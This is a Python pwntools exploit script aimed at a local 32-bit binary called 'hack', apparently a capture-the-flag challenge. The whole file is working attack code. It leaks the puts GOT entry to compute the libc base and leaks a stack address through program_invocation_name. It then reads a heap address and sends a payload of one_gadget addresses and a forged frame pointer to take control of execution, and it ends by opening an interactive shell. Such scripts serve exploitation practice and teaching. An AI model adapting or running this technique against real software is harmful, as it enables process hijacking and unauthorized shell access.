#!/usr/bin/python


from pwn import * 
r = process("./hack")

e = ELF("./hack")

libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

content = r.recvline()
print(content)
address = content[-10:]
# address = int(address,16)
print(r.recv(1024))
# print(address)

putsGot = e.got['puts']
print("[*] puts got addrss :" + hex(putsGot))

r.sendline(str(putsGot)) # puts got

putAddr = r.recvline()[-11:-1]
print("[*] put address: "+putAddr)
putSymbol = libc.symbols["puts"]
print("[*] puts function symbols addr:" + hex(putSymbol))
libcBase = int(putAddr,16) - putSymbol
print("[*] libc Base addr :"+hex(libcBase))


invocation_name_symbols = libc.symbols["program_invocation_name"]
invocation_short_name_symbols = libc.symbols["program_invocation_short_name"] 
print("[*] program_invocation_name symbols addr : "+ hex(invocation_name_symbols))
print("[*] program_invocation_short_name symbols addr : "+ hex(invocation_short_name_symbols))
invocation_name_addr = invocation_name_symbols + libcBase
invocation_short_name_addr = invocation_short_name_symbols + libcBase
print("[*] program_invocation_name addr: " + hex(invocation_name_addr))
print("[*] program_invocation_short_name addr: " + hex(invocation_short_name_addr))
print(r.recvline())
r.sendline(str(invocation_name_addr))
stackAddr = r.recvline()[-11:-1]
ebpAddr = int(stackAddr,16) - 690
print("[*] stackAddr:"+ stackAddr)



heapAddr = int(r.recv(1024)[27:36],16)
print("[*] heap addr :" + hex(heapAddr))
# gdb.attach(r,"b *0x08048702")
one_gadget = 0x3ac5c 

print("[*] move eip to :" + hex(0x5fbc5 + libcBase))

r.sendline(p32(one_gadget + libcBase)+p32(one_gadget + libcBase)+p32(heapAddr + 4 )+p32(ebpAddr-4 -8))
# raw_input(">")
r.interactive()
# raw_input(":")

print(r.recvline())


